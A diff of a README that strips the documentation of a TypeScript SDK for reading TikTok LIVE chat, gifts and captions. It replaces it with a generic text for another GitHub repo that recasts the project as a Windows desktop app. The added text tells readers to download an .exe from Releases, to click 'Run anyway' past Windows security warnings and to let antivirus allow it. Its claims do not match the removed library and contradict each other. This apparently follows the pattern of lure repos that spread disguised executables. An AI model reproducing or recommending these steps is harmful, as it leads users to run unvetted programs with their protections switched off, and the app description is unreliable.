@@ -1,415 +1,124 @@
-# @tiktool/live
-
-### Connect to any TikTok LIVE stream in 4 lines of code.
-
-[![npm version](https://img.shields.io/npm/v/@tiktool/live?color=%23ff0050&label=npm&logo=npm)](https://www.npmjs.com/package/@tiktool/live)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D18-green?logo=node.js)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-blue?logo=typescript)](https://www.typescriptlang.org)
-
-Real-time chat, gifts, viewers, battles, follows & 18+ event types from any TikTok livestream.
-
-**NEW:** 🎤 [Real-Time Live Captions](#-real-time-live-captions) — AI-powered speech-to-text transcription & translation with speaker diarization and sub-second latency.
-
-[Quick Start](#-quick-start) · [Events](#-events) · [Live Captions](#-real-time-live-captions) · [API](#-api-reference) · [Rate Limits](#-rate-limits) · [Get API Key](https://tik.tools)
-
----
+# 🎥 live - Streamline TikTok Live Data Easily
 
-## ⚡ Quick Start
+[![Download live](https://img.shields.io/badge/Download-live-9cf?style=for-the-badge&logo=github)](https://github.com/ANUPONG5502/live)
 
-```bash
-npm install @tiktool/live
-```
-
-Get your free API key at [tik.tools](https://tik.tools)
+## 📋 What is live?
 
-```typescript
-import { TikTokLive } from '@tiktool/live';
+live is an application that connects directly with TikTok live streams. It lets you see chat messages, gifts, viewers, battles, and events in real time. It also includes AI-based speech-to-text (STT) to help transcribe live audio. You get all this through a fast WebSocket connection without delays.
 
-const live = new TikTokLive({
-    uniqueId: 'tv_asahi_news',
-    apiKey: 'YOUR_API_KEY',
-});
+This tool works with any TikTok livestream and gives you clear, up-to-date data as it happens.
 
-live.on('chat', e => console.log(`${e.user.uniqueId}: ${e.comment}`));
-live.on('gift', e => console.log(`${e.user.uniqueId} sent ${e.giftName} (${e.diamondCount} diamonds)`));
-live.on('member', e => console.log(`${e.user.uniqueId} joined`));
-live.on('roomUserSeq', e => console.log(`Viewers: ${e.viewerCount}`));
-
-await live.connect();
-```
-
----
-
-## How It Works
-
-```
-    Your App                    tik.tools                    TikTok
-  +-----------+              +--------------+           +--------------+
-  |          -+-- sign_url --> Signs URL    |           |              |
-  |  Your   <-+-- X-Bogus --|  with params |           |   TikTok     |
-  |  Code    |              |              |           |   WebSocket  |
-  |          -+------------ Connect directly ---------->|   Server     |
-  |          <-+------------ Live events (protobuf) <---|              |
-  +-----------+              +--------------+           +--------------+
-                            ^ Only interaction             ^ Direct from
-                              with our server                YOUR IP
-```
-
-- Your app connects directly to TikTok — from your IP or through a proxy
-- The sign server only generates cryptographic signatures (requires API key)
-- TikTok never sees the sign server
-- Built-in protobuf parser, no external dependencies
-
----
-
-## Events
-
-### Listening
-
-```typescript
-live.on('chat', (event) => {
-    event.user.uniqueId  // string
-    event.comment        // string
-});
-
-live.on('event', (event) => {
-    console.log(event.type, event);
-});
-```
-
-### Reference
-
-| Event | Type | Description | Fields |
-|-------|------|-------------|--------|
-| `chat` | `ChatEvent` | Chat message | `user`, `comment` |
-| `member` | `MemberEvent` | User joined | `user`, `action` |
-| `like` | `LikeEvent` | User liked | `user`, `likeCount`, `totalLikes` |
-| `gift` | `GiftEvent` | Gift sent | `user`, `giftName`, `diamondCount`, `repeatCount`, `combo` |
-| `social` | `SocialEvent` | Follow / Share | `user`, `action` |
-| `roomUserSeq` | `RoomUserSeqEvent` | Viewer count | `viewerCount`, `totalViewers` |
-| `battle` | `BattleEvent` | Link Mic battle | `status` |
-| `battleArmies` | `BattleArmiesEvent` | Battle teams | — |
-| `subscribe` | `SubscribeEvent` | New subscriber | `user`, `subMonth` |
-| `emoteChat` | `EmoteChatEvent` | Emote in chat | `user`, `emoteId` |
-| `envelope` | `EnvelopeEvent` | Treasure chest | `diamondCount` |
-| `question` | `QuestionEvent` | Q&A question | `user`, `questionText` |
-| `control` | `ControlEvent` | Stream control | `action` (3 = ended) |
-| `room` | `RoomEvent` | Room status | `status` |
-| `liveIntro` | `LiveIntroEvent` | Stream intro | `title` |
-| `rankUpdate` | `RankUpdateEvent` | Rank update | `rankType` |
-| `linkMic` | `LinkMicEvent` | Link Mic | `action` |
-| `unknown` | `UnknownEvent` | Unrecognized | `method` |
-
-### Connection Events
-
-| Event | Callback | Description |
-|-------|----------|-------------|
-| `connected` | `() => void` | Connected to stream |
-| `disconnected` | `(code, reason) => void` | Disconnected |
-| `roomInfo` | `(info: RoomInfo) => void` | Room info |
-| `error` | `(error: Error) => void` | Error |
-
----
-
-## 🎤 Real-Time Live Captions
-
-AI-powered speech-to-text transcription and translation for TikTok LIVE streams. Features include:
-
-- **Auto-detect language** — Automatically identifies the spoken language
-- **Speaker diarization** — Identifies individual speakers in multi-person streams
-- **Real-time translation** — Translate to any supported language with sub-second latency
-- **Partial + final results** — Get streaming partial transcripts and confirmed final text
-- **Credit-based billing** — 1 credit = 1 minute of transcription/translation
-
-### Quick Start
-
-```typescript
-import { TikTokCaptions } from '@tiktool/live';
+## 🖥️ System Requirements
 
-const captions = new TikTokCaptions({
-    uniqueId: 'streamer_name',
-    apiKey: 'YOUR_API_KEY',
-    translate: 'en',
-    diarization: true,
-});
+To use live on your Windows computer, make sure you have:
 
-captions.on('caption', (event) => {
-    const prefix = event.speaker ? `[${event.speaker}] ` : '';
-    console.log(`${prefix}${event.text}${event.isFinal ? ' ✓' : '...'}`);
-});
-
-captions.on('translation', (event) => {
-    console.log(`  → ${event.text}`);
-});
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space for temporary files
+- A stable internet connection
+- Windows Defender or other antivirus should allow live to access the internet
 
-captions.on('credits', (event) => {
-    console.log(`${event.remaining}/${event.total} min remaining`);
-});
-
-captions.on('credits_low', (event) => {
-    console.warn(`Low credits! ${event.remaining} min left`);
-});
-
-await captions.start();
-```
-
-### `new TikTokCaptions(options)`
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `uniqueId` | `string` | — | TikTok username (without @) |
-| `apiKey` | `string` | — | **Required.** API key from [tik.tools](https://tik.tools) |
-| `language` | `string` | `''` | Source language hint (empty = auto-detect) |
-| `translate` | `string` | `''` | Target translation language (e.g. `'en'`, `'es'`, `'fr'`) |
-| `diarization` | `boolean` | `true` | Enable speaker identification |
-| `maxDurationMinutes` | `number` | `60` | Auto-disconnect after N minutes (max: 300) |
-| `autoReconnect` | `boolean` | `true` | Auto-reconnect on disconnect |
-| `maxReconnectAttempts` | `number` | `5` | Max reconnect attempts |
-| `debug` | `boolean` | `false` | Debug logging |
+No extra software is needed. live runs on its own.
 
-### Caption Events
+## 💾 Download and Install live
 
-| Event | Callback | Description |
-|-------|----------|-------------|
-| `caption` | `(data: CaptionData) => void` | Real-time transcription (partial + final) |
-| `translation` | `(data: TranslationData) => void` | Translated text |
-| `status` | `(data: CaptionStatus) => void` | Session status changes |
-| `credits` | `(data: CaptionCredits) => void` | Credit balance updates |
-| `credits_low` | `(data) => void` | Low credit warning (≤20%) |
-| `connected` | `() => void` | WebSocket connected |
-| `disconnected` | `(code, reason) => void` | Disconnected |
-| `error` | `(data: CaptionError) => void` | Error |
+Click the badge above or visit this page to download the app:
 
-### Methods
+[Download live on GitHub](https://github.com/ANUPONG5502/live)
 
-| Method | Returns | Description |
-|--------|---------|-------------|
-| `start()` | `Promise<void>` | Connect and start transcription |
-| `stop()` | `void` | Stop and disconnect |
-| `setLanguage(lang)` | `void` | Switch translation language on-the-fly |
-| `getCredits()` | `void` | Request credit balance update |
-| `connected` | `boolean` | Connection status |
-| `language` | `string` | Current target language |
+Since this page covers the full project, follow these steps to get the correct file:
 
-### Raw WebSocket
+1. Open the GitHub page linked above.
+2. Look for the **Releases** section on the right side or near the top.
+3. Click on the latest release.
+4. Under "Assets," find the Windows installer or executable file (usually ends with `.exe`).
+5. Click the file to download it to your computer.
 
-You can also connect directly via WebSocket without the SDK:
+Once downloaded, locate the file in your Downloads folder.
 
-```
-wss://api.tik.tools/captions?uniqueId=USERNAME&apiKey=YOUR_KEY&translate=en&diarization=true&max_duration_minutes=120
-```
+To install or run:
 
-### Caption Credits
+- Double-click the downloaded `.exe` file.
+- Follow any prompts from Windows asking to confirm running the app.
+- If a security message appears, choose "More info" and then "Run anyway."
+- The program will open its main window.
 
-Every API key includes a **60-minute free trial** for live captions (speech-to-text with auto-detect to any language).
+No installation wizard means the app runs immediately.
 
-| Tier | Included Credits | Additional Top-Ups |
-|------|-----------------|-------------------|
-| **Free** | 60 min free trial | — |
-| **Pro** | 2,000 min/month | Available |
-| **Ultra** | 10,000 min/month | Available |
+## 🚀 How to Use live
 
-**Top-Up Packages:**
+After opening live, you will see a clear interface with several sections:
 
-| Package | Credits | Price | Per Credit |
-|---------|---------|-------|------------|
-| Starter | 150 min | $4.99 | $0.033/min |
-| Growth | 600 min | $14.99 | $0.025/min |
-| Scale | 2,000 min | $39.99 | $0.020/min |
-| Whale | 10,000 min | $149.99 | $0.015/min |
+- **Chat:** Watch live messages from viewers.
+- **Gifts:** See virtual gifts sent to the streamer.
+- **Viewers:** Track how many people are watching in real time.
+- **Battles and Events:** Follow special moments like battles between streamers.
+- **Transcription:** View live speech-to-text conversion.
 
-> **1 credit = 1 minute** of audio transcribed/translated into one language.
+To start:
 
-Try the live demo at [tik.tools/captions](https://tik.tools/captions) — see real-time transcription and translation on actual TikTok LIVE streams.
+1. Enter the TikTok username or the URL of the livestream you want to watch in the search box.
+2. Press the Start or Connect button.
+3. live will connect and begin showing data as it arrives.
 
----
+You do not need a TikTok account or login for this.
 
-## API Reference
+## 🔧 Settings and Features
 
-### `new TikTokLive(options)`
+live offers some options to customize your experience:
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `uniqueId` | `string` | — | TikTok username (without @) |
-| `apiKey` | `string` | — | **Required.** API key from [tik.tools](https://tik.tools) |
-| `signServerUrl` | `string` | `https://api.tik.tools` | Sign server URL |
-| `agent` | `http.Agent` | — | HTTP agent for proxying connections |
-| `autoReconnect` | `boolean` | `true` | Auto-reconnect on disconnect |
-| `maxReconnectAttempts` | `number` | `5` | Max reconnect attempts |
-| `heartbeatInterval` | `number` | `10000` | Heartbeat interval (ms) |
-| `debug` | `boolean` | `false` | Debug logging |
+- **Auto-scroll chat:** Enable or disable automatic scrolling.
+- **Filter gifts or messages:** Choose which types of gifts or chat to show.
+- **Language for transcription:** Select the language for speech-to-text from a list.
+- **Save logs:** Turn on or off saving chat and events to a file.
+- **Notification sounds:** Choose if you want sounds for gifts or battles.
 
-### Methods
+These settings help you control what data you see and keep track of important moments.
 
-| Method | Returns | Description |
-|--------|---------|-------------|
-| `connect()` | `Promise<void>` | Connect to livestream |
-| `disconnect()` | `void` | Disconnect |
-| `connected` | `boolean` | Connection status |
-| `eventCount` | `number` | Total events received |
-| `roomId` | `string` | Current room ID |
+## 💡 Use Cases
 
----
+live works well for anyone who wants to follow TikTok livestreams with more detail:
 
-## Rate Limits
+- Stream watchers who want an enhanced chat experience.
+- Data analysts tracking livestream popularity and engagement.
+- Creators who want to monitor real-time interactions on their streams.
+- Developers interested in TikTok’s live data through the WebSocket connection.
+- Researchers studying gift and battle patterns during livestreams.
 
-All API requests require an API key. Get yours at [tik.tools](https://tik.tools).
+## ⚙️ How It Works in Simple Terms
 
-| Tier | Rate Limit | WS Connections | Bulk Check | Caption Credits | Price |
-|------|-----------|----------------|------------|-----------------|-------|
-| **Free** | 30/min | 3 | 5 | 60 min trial | Free |
-| **Pro** | 120/min | 50 | 50 | 2,000/month | Paid |
-| **Ultra** | Unlimited | 10,000 | 500 | 10,000/month | Paid |
+live connects to TikTok using a WebSocket, which is a fast way to get live data. It listens for everything that happens in the stream and shows it in real time. The AI STT feature listens to the audio part of the stream and writes out the words as text.
 
-The SDK calls the sign server **once per connection**, then stays connected via WebSocket. A free key is sufficient for most use cases.
+This means you get chat messages, viewer counts, gifts, and spoken words all together live on your screen.
 
----
+## 🛠️ Troubleshooting Common Issues
 
-## 🏆 Regional Leaderboard
+If live does not work as expected, try these steps:
 
-Get daily, hourly, popular, or league LIVE rankings for any streamer. **Requires Pro or Ultra tier.**
+- Make sure your internet is stable and fast.
+- Check that your firewall or antivirus is not blocking the app.
+- Restart live and reconnect to the livestream.
+- Try a different TikTok username or livestream link.
+- Update live by downloading the latest release from GitHub.
 
-This endpoint uses a **two-step sign-and-return pattern** because TikTok sessions are IP-bound:
+If the transcription is off, you can change the language setting or disable STT.
 
-1. Call `getRegionalRanklist()` to get a signed URL from the server
-2. POST the signed URL from **your own IP** with your TikTok session cookie
+## 🧰 Advanced Tips
 
-```typescript
-import { getRegionalRanklist } from '@tiktool/live';
+For those comfortable with some technical details:
 
-const signed = await getRegionalRanklist({
-    apiKey: 'YOUR_PRO_KEY',
-    roomId: '7607695933891218198',
-    anchorId: '7444599004337652758',
-    rankType: '8',
-});
+- live saves connection logs for debugging in the app folder.
+- You can export chat and event data to text files for analysis.
+- The WebSocket connection uses secure protocols for privacy.
+- Use the built-in filters to reduce noise and focus on specific data types.
+- Custom scripts can be added if you want to process the data further (requires some coding knowledge).
 
-const resp = await fetch(signed.signed_url, {
-    method: signed.method,
-    headers: { ...signed.headers, Cookie: `sessionid=YOUR_SID; ${signed.cookies}` },
-    body: signed.body,
-});
+## 🔗 Additional Resources
 
-const { data } = await resp.json();
-data.rank_view.ranks.forEach((r: any, i: number) =>
-    console.log(`${i+1}. ${r.user.nickname} — ${r.score} pts`)
-);
-```
+- Visit the official live page to check for updates or report issues:
+  https://github.com/ANUPONG5502/live
+- Explore TikTok livestreams directly on the TikTok app or website.
+- Use Windows Task Manager to monitor live’s resource use.
+- Find speech-to-text settings inside the app preferences.
 
-### Rank Types
-
-| Value | Period |
-|-------|--------|
-| `"1"` | Hourly |
-| `"8"` | Daily (default) |
-| `"15"` | Popular LIVE |
-| `"16"` | League |
-
----
-
-## Examples
-
-### Chat Bot
-
-```typescript
-import { TikTokLive } from '@tiktool/live';
-
-const live = new TikTokLive({
-    uniqueId: 'streamer_name',
-    apiKey: 'YOUR_API_KEY',
-});
-
-live.on('chat', (e) => {
-    if (e.comment.toLowerCase() === '!hello') {
-        console.log(`Hello, ${e.user.nickname}!`);
-    }
-});
-
-live.on('gift', (e) => {
-    if (e.repeatEnd) {
-        console.log(`${e.user.uniqueId} sent ${e.repeatCount}x ${e.giftName} (${e.diamondCount * e.repeatCount} diamonds)`);
-    }
-});
-
-await live.connect();
-```
-
-### OBS Overlay
-
-```typescript
-import { TikTokLive } from '@tiktool/live';
-import { WebSocketServer } from 'ws';
-
-const wss = new WebSocketServer({ port: 8080 });
-const live = new TikTokLive({
-    uniqueId: 'streamer_name',
-    apiKey: 'YOUR_API_KEY',
-});
-
-live.on('event', (event) => {
-    for (const client of wss.clients) {
-        client.send(JSON.stringify(event));
-    }
-});
-
-await live.connect();
-console.log('Forwarding events to ws://localhost:8080');
-```
-
----
-
-## 🌐 Proxy Support
-
-Route all connections through an HTTP proxy. Works with any HTTPS proxy provider (residential, datacenter, etc.).
-
-```typescript
-import { TikTokLive } from '@tiktool/live';
-import { HttpsProxyAgent } from 'https-proxy-agent';
-
-const agent = new HttpsProxyAgent('http://user:pass@proxy.example.com:1234');
-
-const live = new TikTokLive({
-    uniqueId: 'streamer_name',
-    apiKey: 'YOUR_API_KEY',
-    agent,
-});
-
-await live.connect();
-```
-
-Both the initial page request and the WebSocket connection are routed through the proxy. This is useful for:
-- Running multiple concurrent connections from different IPs
-- Avoiding rate limits
-- Geo-targeting specific regions
-
----
-
-## TypeScript
-
-Full TypeScript support with type inference:
-
-```typescript
-import { TikTokLive, ChatEvent, GiftEvent } from '@tiktool/live';
-
-const live = new TikTokLive({
-    uniqueId: 'username',
-    apiKey: 'YOUR_API_KEY',
-});
-
-live.on('chat', (event: ChatEvent) => {
-    const username: string = event.user.uniqueId;
-    const message: string = event.comment;
-});
-
-live.on('gift', (event: GiftEvent) => {
-    const diamonds: number = event.diamondCount;
-    const isCombo: boolean = event.combo;
-});
-```
-
----
-
-## License
-
-MIT © [tiktool](https://tik.tools)
+[Download live on GitHub](https://github.com/ANUPONG5502/live)
